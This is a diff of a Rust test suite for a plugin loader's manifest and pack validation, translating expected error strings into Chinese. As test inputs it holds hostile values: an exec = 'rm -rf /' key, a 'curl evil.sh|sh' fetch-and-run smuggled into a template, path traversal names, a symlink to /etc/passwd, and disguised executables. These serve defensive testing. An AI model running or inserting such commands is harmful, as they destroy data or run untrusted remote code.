@@ -176,90 +176,86 @@ fn a_nonexistent_root_is_an_empty_catalog() {
 fn manifests_are_refused_for_every_rule_they_break() {
     let root = tempdir().unwrap();
     let cases: &[(&str, &str, &str)] = &[
-        ("kind = 'sound'", "kind = 'script'", "unknown plugin kind"),
-        ("kind = 'sound'", "kind = 'wasm'", "unknown plugin kind"),
+        ("kind = 'sound'", "kind = 'script'", "不是已知的扩展类型"),
+        ("kind = 'sound'", "kind = 'wasm'", "不是已知的扩展类型"),
         (
             "permissions = []",
             "permissions = ['network']",
-            "may not request permissions",
+            "不能申请权限",
         ),
         (
             "permissions = []",
             "permissions = 'none'",
-            "permissions must be an array",
+            "permissions 必须是数组",
         ),
-        ("license = 'CC-BY-4.0'\n", "", "license must be a string"),
+        ("license = 'CC-BY-4.0'\n", "", "license 必须是字符串"),
         ("license = 'CC-BY-4.0'", "license = '<script>'", "SPDX"),
         (
             "license = 'CC-BY-4.0'",
             "license = '   '",
-            "license has invalid",
+            "license 的长度或字符",
         ),
         (
             "schema_version = 1",
             "schema_version = 2",
-            "unsupported schema_version",
+            "不支持这个 schema_version",
         ),
         (
             "author = 'Synthetic'",
             "authors = 'Synthetic'",
-            "unknown manifest key authors",
+            "未知的键 authors",
         ),
         (
             "mode = 'keys'",
             "mode = 'keys'\nexec = 'rm -rf /'",
-            "unknown manifest key exec",
+            "未知的键 exec",
         ),
         (
             "space = 'space.wav'",
             "tab = 'space.wav'",
-            "unknown key tab in sounds",
+            "sounds 里有未知的键 tab",
         ),
-        (
-            "default = 'key.wav'\n",
-            "",
-            "keys mode needs sounds.default",
-        ),
+        ("default = 'key.wav'\n", "", "keys 模式需要 sounds.default"),
         (
             "mode = 'keys'",
             "mode = 'loop'",
-            "mode must be keys or sequence",
+            "mode 只能是 keys 或 sequence",
         ),
         (
             "mode = 'keys'",
             "mode = 'sequence'",
-            "sequence mode needs a sequence",
+            "sequence 模式需要 sequence",
         ),
         (
             "space = 'space.wav'",
             "space = '../space.wav'",
-            "not a .wav or .ogg file name",
+            "不是 .wav 或 .ogg 文件名",
         ),
         (
             "space = 'space.wav'",
             "space = '/etc/space.wav'",
-            "not a .wav or .ogg file name",
+            "不是 .wav 或 .ogg 文件名",
         ),
         (
             "space = 'space.wav'",
             "space = 'sub/space.wav'",
-            "not a .wav or .ogg file name",
+            "不是 .wav 或 .ogg 文件名",
         ),
         (
             "space = 'space.wav'",
             "space = 'space.mp3'",
-            "not a .wav or .ogg file name",
+            "不是 .wav 或 .ogg 文件名",
         ),
         (
             "space = 'space.wav'",
             "space = 'missing.wav'",
-            "missing audio file",
+            "缺少音频文件",
         ),
-        ("name = '打字机'", "name = ''", "name has invalid"),
+        ("name = '打字机'", "name = ''", "name 的长度或字符"),
         (
             "name = '打字机'",
             "name = \"a\\u0007b\"",
-            "name has invalid",
+            "name 的长度或字符",
         ),
     ];
     for (from, to, expected) in cases {
@@ -272,11 +268,11 @@ fn manifests_are_refused_for_every_rule_they_break() {
     }
     // A pack in the wrong kind directory, or under another folder name.
     let pack = sound_pack(&kind_directory(root.path(), PluginKind::Music), SOUND);
-    assert!(reason(root.path(), PluginKind::Music, "typewriter").contains("kind does not match"));
+    assert!(reason(root.path(), PluginKind::Music, "typewriter").contains("kind 与所在目录不一致"));
     fs::remove_dir_all(pack).unwrap();
     let pack = installed_sound(root.path(), SOUND);
     fs::rename(&pack, pack.with_file_name("renamed")).unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "renamed").contains("id does not match"));
+    assert!(reason(root.path(), PluginKind::Sound, "renamed").contains("id 与文件夹名不一致"));
 }
 
 #[test]
@@ -285,15 +281,12 @@ fn sequences_are_bounded() {
     let base = "schema_version = 1\nkind = 'sound'\nid = 'tune'\nname = 'Tune'\nversion = '1'\nlicense = 'CC0-1.0'\nmode = 'sequence'\n[sequence]\nsample = 'key.wav'\n";
     let too_many = format!("semitones = [{}]\n", vec!["0"; 129].join(","));
     for (sequence, expected) in [
-        ("semitones = [0, 25]\n", "from -24 to 24"),
-        ("semitones = [0, 1.5]\n", "from -24 to 24"),
-        ("semitones = []\n", "too few or too many"),
-        (too_many.as_str(), "too few or too many"),
-        ("semitones = [0]\nadvance = 'time'\n", "advance must be"),
-        (
-            "semitones = [0]\nrate = 2\n",
-            "unknown key rate in sequence",
-        ),
+        ("semitones = [0, 25]\n", "-24 到 24"),
+        ("semitones = [0, 1.5]\n", "-24 到 24"),
+        ("semitones = []\n", "不在允许范围内"),
+        (too_many.as_str(), "不在允许范围内"),
+        ("semitones = [0]\nadvance = 'time'\n", "advance 只能是"),
+        ("semitones = [0]\nrate = 2\n", "sequence 里有未知的键 rate"),
     ] {
         let pack = installed_sound(root.path(), &format!("{base}{sequence}"));
         let error = reason(root.path(), PluginKind::Sound, "tune");
@@ -305,7 +298,8 @@ fn sequences_are_bounded() {
         &format!("{base}semitones = [-24, 0, 24]\nadvance = 'commit'\n"),
     );
     // `space.wav` is in the directory but not in this manifest.
-    assert!(reason(root.path(), PluginKind::Sound, "tune").contains("space.wav is not used"));
+    assert!(reason(root.path(), PluginKind::Sound, "tune")
+        .contains("space.wav 没有在 plugin.toml 里用到"));
     fs::remove_file(kind_directory(root.path(), PluginKind::Sound).join("tune/space.wav")).unwrap();
     let pack = load_package(root.path(), None, PluginKind::Sound, "tune").unwrap();
     let PluginContent::Sound(sound) = pack.content else {
@@ -319,7 +313,7 @@ fn sequences_are_bounded() {
     );
     installed_sound(root.path(), &keys);
     assert!(reason(root.path(), PluginKind::Sound, "typewriter")
-        .contains("only allowed in sequence mode"));
+        .contains("只有 sequence 模式才能有 sequence"));
 }
 
 #[test]
@@ -335,23 +329,31 @@ fn pack_directories_hold_only_plain_files_the_manifest_accounts_for() {
         vec![b'x'; MAX_NOTICE_BYTES as usize + 1],
     )
     .unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("README.md is too large"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("README.md 太大"));
     fs::remove_file(pack.join("README.md")).unwrap();
 
     for (name, contents, expected) in [
-        ("run.sh", &b"#!/bin/sh"[..], "run.sh is not used"),
-        ("extra.wav", &wav()[..], "extra.wav is not used"),
+        (
+            "run.sh",
+            &b"#!/bin/sh"[..],
+            "run.sh 没有在 plugin.toml 里用到",
+        ),
+        (
+            "extra.wav",
+            &wav()[..],
+            "extra.wav 没有在 plugin.toml 里用到",
+        ),
         (
             "lib.dylib",
             &b"\xcf\xfa\xed\xfe"[..],
-            "lib.dylib is not used",
+            "lib.dylib 没有在 plugin.toml 里用到",
         ),
-        ("Key.WAV.exe", &b"MZ"[..], "Key.WAV.exe is not used"),
         (
-            "key wav.txt",
-            &b"x"[..],
-            "key wav.txt is not a valid file name",
+            "Key.WAV.exe",
+            &b"MZ"[..],
+            "Key.WAV.exe 没有在 plugin.toml 里用到",
         ),
+        ("key wav.txt", &b"x"[..], "key wav.txt 不是有效的文件名"),
     ] {
         fs::write(pack.join(name), contents).unwrap();
         let error = reason(root.path(), PluginKind::Sound, "typewriter");
@@ -365,15 +367,13 @@ fn pack_directories_hold_only_plain_files_the_manifest_accounts_for() {
     assert!(load_package(root.path(), None, PluginKind::Sound, "typewriter").is_ok());
 
     fs::create_dir(pack.join("nested")).unwrap();
-    assert!(
-        reason(root.path(), PluginKind::Sound, "typewriter").contains("nested is a subdirectory")
-    );
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("nested 是子文件夹"));
     fs::remove_dir(pack.join("nested")).unwrap();
 
     for index in 0..MAX_PACK_FILES {
         fs::write(pack.join(format!("NOTICE-{index}.txt")), b"x").unwrap();
     }
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("too many files"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("文件太多"));
 }
 
 #[test]
@@ -381,15 +381,15 @@ fn audio_is_checked_for_size_and_format_without_being_decoded() {
     let root = tempdir().unwrap();
     let pack = installed_sound(root.path(), SOUND);
     fs::write(pack.join("space.wav"), b"#!/bin/sh\nnot audio at all").unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("not a WAV or Ogg"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是 WAV 或 Ogg"));
     fs::write(pack.join("space.wav"), b"OggS but named wav").unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("not a WAV or Ogg"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是 WAV 或 Ogg"));
     fs::write(pack.join("space.wav"), b"").unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("empty or too large"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("为空或太大"));
     let mut oversized = wav();
     oversized.resize(sound_pack::MAX_SAMPLE_BYTES as usize + 1, 0);
     fs::write(pack.join("space.wav"), oversized).unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("empty or too large"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("为空或太大"));
 
     assert!(sound_pack::sample_frames_allowed(44_100, 66_150));
     assert!(!sound_pack::sample_frames_allowed(44_100, 66_151));
@@ -409,9 +409,9 @@ fn music_packs_are_bounded() {
         format!("schema_version = 1\nkind = 'music'\nid = 'rain'\nname = 'Rain'\nversion = '1'\nlicense = 'CC0-1.0'\n[music]\ntracks = [{tracks}]\n")
     };
     for (tracks, expected) in [
-        ("", "too few or too many"),
-        ("'a.ogg','a.ogg'", "listed twice"),
-        ("'a.flac'", "not a .wav or .ogg"),
+        ("", "不在允许范围内"),
+        ("'a.ogg','a.ogg'", "重复了"),
+        ("'a.flac'", "不是 .wav 或 .ogg"),
     ] {
         fs::write(pack.join(MANIFEST_FILE), manifest(tracks)).unwrap();
         let error = reason(root.path(), PluginKind::Music, "rain");
@@ -419,7 +419,7 @@ fn music_packs_are_bounded() {
     }
     let nine: Vec<_> = (0..9).map(|index| format!("'t{index}.ogg'")).collect();
     fs::write(pack.join(MANIFEST_FILE), manifest(&nine.join(","))).unwrap();
-    assert!(reason(root.path(), PluginKind::Music, "rain").contains("too few or too many"));
+    assert!(reason(root.path(), PluginKind::Music, "rain").contains("不在允许范围内"));
 
     // Five tracks just under the per-track limit are over the pack limit together. Sparse files keep this cheap.
     let names: Vec<_> = (0..5).map(|index| format!("t{index}.ogg")).collect();
@@ -430,7 +430,7 @@ fn music_packs_are_bounded() {
     }
     let quoted: Vec<_> = names.iter().map(|name| format!("'{name}'")).collect();
     fs::write(pack.join(MANIFEST_FILE), manifest(&quoted.join(","))).unwrap();
-    assert!(reason(root.path(), PluginKind::Music, "rain").contains("too large together"));
+    assert!(reason(root.path(), PluginKind::Music, "rain").contains("加起来太大"));
     fs::remove_file(pack.join(&names[4])).unwrap();
     fs::write(pack.join(MANIFEST_FILE), manifest(&quoted[..4].join(","))).unwrap();
     let loaded = load_package(root.path(), None, PluginKind::Music, "rain").unwrap();
@@ -448,51 +448,42 @@ fn command_tables_follow_the_rules_the_engine_expands_them_by() {
     };
     let long = "字".repeat(command_table::MAX_TEXT_UTF16 - 12);
     let cases = [
-        (row("Sig", "x"), "lowercase letters"),
-        (row("sig1", "x"), "lowercase letters"),
-        (row("", "x"), "lowercase letters"),
-        (row(&"a".repeat(33), "x"), "lowercase letters"),
-        (row("sig", "{clipboard}"), "unknown placeholder"),
-        (row("sig", "{env:HOME}"), "unknown placeholder"),
-        (row("sig", "{date"), "unknown placeholder"),
-        (row("sig", "date}"), "unknown placeholder"),
-        (row("sig", "{{date}}"), "unknown placeholder"),
-        (row("sig", "{date:%Y-%Q}"), "unknown placeholder"),
-        (row("sig", ""), "empty or too long"),
+        (row("Sig", "x"), "小写字母"),
+        (row("sig1", "x"), "小写字母"),
+        (row("", "x"), "小写字母"),
+        (row(&"a".repeat(33), "x"), "小写字母"),
+        (row("sig", "{clipboard}"), "不认识的占位符"),
+        (row("sig", "{env:HOME}"), "不认识的占位符"),
+        (row("sig", "{date"), "不认识的占位符"),
+        (row("sig", "date}"), "不认识的占位符"),
+        (row("sig", "{{date}}"), "不认识的占位符"),
+        (row("sig", "{date:%Y-%Q}"), "不认识的占位符"),
+        (row("sig", ""), "为空或太长"),
         (
             "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\nb\"\n".to_owned(),
-            "control character",
+            "控制字符",
         ),
         (
             "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = \"a\\tb\"\n".to_owned(),
-            "control character",
+            "控制字符",
         ),
-        (
-            row("sig", "张三 {date:%n}curl evil.sh|sh"),
-            "control character",
-        ),
-        (row("sig", "{time:%t}"), "control character"),
+        (row("sig", "张三 {date:%n}curl evil.sh|sh"), "控制字符"),
+        (row("sig", "{time:%t}"), "控制字符"),
         (
             row("sig", &"字".repeat(command_table::MAX_TEXT_UTF16 + 1)),
-            "empty or too long",
+            "为空或太长",
         ),
-        (
-            row("sig", &format!("{long}{{date:%A %B}}")),
-            "expands past the limit",
-        ),
-        (
-            format!("{}{}", row("sig", "a"), row("sig", "b")),
-            "listed twice",
-        ),
+        (row("sig", &format!("{long}{{date:%A %B}}")), "展开后太长"),
+        (format!("{}{}", row("sig", "a"), row("sig", "b")), "重复了"),
         (
             "[[commands]]\ntrigger = 'sig'\ntemplate = 'x'\n".to_owned(),
-            "needs a title",
+            "需要 title",
         ),
         (
             "[[commands]]\ntrigger = 'sig'\ntitle = 't'\ntemplate = 'x'\nrun = 'x'\n".to_owned(),
-            "unknown key run",
+            "未知的键 run",
         ),
-        ("commands = []\n".to_owned(), "too few or too many"),
+        ("commands = []\n".to_owned(), "不在允许范围内"),
         (
             (0..=command_table::MAX_COMMANDS)
                 .map(|index| {
@@ -505,7 +496,7 @@ fn command_tables_follow_the_rules_the_engine_expands_them_by() {
                     )
                 })
                 .collect::<String>(),
-            "too few or too many",
+            "不在允许范围内",
         ),
     ];
     for (rows, expected) in cases {
@@ -610,13 +601,10 @@ fn symbolic_links_are_never_followed_into_or_out_of_a_pack() {
     let pack = installed_sound(root.path(), SOUND);
     fs::remove_file(pack.join("space.wav")).unwrap();
     std::os::unix::fs::symlink(outside.path().join("secret.wav"), pack.join("space.wav")).unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter")
-        .contains("space.wav is a symbolic link"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("space.wav 是符号链接"));
     fs::remove_file(pack.join("space.wav")).unwrap();
     std::os::unix::fs::symlink(outside.path(), pack.join("assets")).unwrap();
-    assert!(
-        reason(root.path(), PluginKind::Sound, "typewriter").contains("assets is a symbolic link")
-    );
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("assets 是符号链接"));
     fs::remove_dir_all(&pack).unwrap();
 
     // A linked pack directory, and a linked manifest.
@@ -626,7 +614,7 @@ fn symbolic_links_are_never_followed_into_or_out_of_a_pack() {
         kind_directory(root.path(), PluginKind::Sound).join("typewriter"),
     )
     .unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("not a plugin directory"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("不是扩展包文件夹"));
     let catalog = scan(root.path(), None);
     assert!(catalog.packages.is_empty());
     assert_eq!(catalog.issues[0].folder, "typewriter");
@@ -634,16 +622,16 @@ fn symbolic_links_are_never_followed_into_or_out_of_a_pack() {
     let pack = installed_sound(root.path(), SOUND);
     fs::remove_file(pack.join(MANIFEST_FILE)).unwrap();
     std::os::unix::fs::symlink(real.join(MANIFEST_FILE), pack.join(MANIFEST_FILE)).unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("symbolic link"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("符号链接"));
 }
 
 #[test]
 fn built_in_ids_are_reserved_and_resolved_only_from_the_bundle() {
     let root = tempdir().unwrap();
     installed_sound(root.path(), &SOUND.replace("typewriter", "default"));
-    assert!(reason(root.path(), PluginKind::Sound, "default").contains("not available"));
+    assert!(reason(root.path(), PluginKind::Sound, "default").contains("内置音效包不可用"));
     let catalog = scan(root.path(), None);
-    assert!(catalog.issues[0].reason.contains("reserved"));
+    assert!(catalog.issues[0].reason.contains("属于内置音效包"));
     let resolved = load_package(
         root.path(),
         Some(&builtin_root()),
@@ -663,7 +651,7 @@ fn a_manifest_past_its_size_is_not_parsed() {
     let mut manifest = SOUND.to_owned();
     manifest.push_str(&format!("# {}\n", "x".repeat(MAX_MANIFEST_BYTES as usize)));
     fs::write(pack.join(MANIFEST_FILE), manifest).unwrap();
-    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("too large"));
+    assert!(reason(root.path(), PluginKind::Sound, "typewriter").contains("太大"));
 }
 
 fn picked_folder(parent: &Path, manifest: &str) -> PathBuf {
@@ -721,13 +709,13 @@ fn a_refused_import_leaves_the_installed_pack_and_no_staging() {
         &SOUND.replace("permissions = []", "permissions = ['exec']"),
     );
     assert!(
-        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("permissions"))
+        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("不能申请权限"))
     );
     fs::remove_dir_all(&folder).unwrap();
     let folder = sound_pack(hostile.path(), SOUND);
     fs::create_dir(folder.join("payload")).unwrap();
     assert!(
-        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("subdirectory"))
+        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("子文件夹"))
     );
     fs::remove_dir_all(&folder).unwrap();
     let folder = sound_pack(hostile.path(), SOUND);
@@ -737,7 +725,7 @@ fn a_refused_import_leaves_the_installed_pack_and_no_staging() {
         .set_len(music_pack::MAX_TRACK_BYTES + 1)
         .unwrap();
     assert!(
-        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("too large"))
+        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("太大"))
     );
 
     assert_eq!(
@@ -774,7 +762,7 @@ fn import_refuses_built_in_ids_and_what_is_not_a_pack() {
     let bare = files.path().join("bare");
     fs::create_dir(&bare).unwrap();
     assert!(
-        matches!(import(&bare, &root), Err(PluginError::Invalid(reason)) if reason.contains("missing plugin.toml"))
+        matches!(import(&bare, &root), Err(PluginError::Invalid(reason)) if reason.contains("缺少 plugin.toml"))
     );
 }
 
@@ -789,7 +777,7 @@ fn import_follows_no_symbolic_link() {
     let folder = sound_pack(files.path(), SOUND);
     std::os::unix::fs::symlink("/etc/passwd", folder.join("passwd.txt")).unwrap();
     assert!(
-        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("symbolic link"))
+        matches!(import(&folder, &root), Err(PluginError::Invalid(reason)) if reason.contains("符号链接"))
     );
     fs::remove_file(folder.join("passwd.txt")).unwrap();
 
@@ -969,7 +957,7 @@ fn hostile_archives_are_refused_before_anything_is_installed() {
     writer.finish().unwrap();
     match import(&crowded, &root) {
         Err(PluginError::Archive(reason)) => {
-            assert!(reason.contains("directory is too large"), "{reason}")
+            assert!(reason.contains("目录太大"), "{reason}")
         }
         other => panic!("{other:?}"),
     }
@@ -1001,7 +989,7 @@ fn an_archived_symbolic_link_is_refused() {
     writer.finish().unwrap();
     assert!(matches!(
         import(&archive, &state.path().join("plugins")),
-        Err(PluginError::Invalid(reason)) if reason.contains("symbolic link")
+        Err(PluginError::Invalid(reason)) if reason.contains("符号链接")
     ));
 }
 
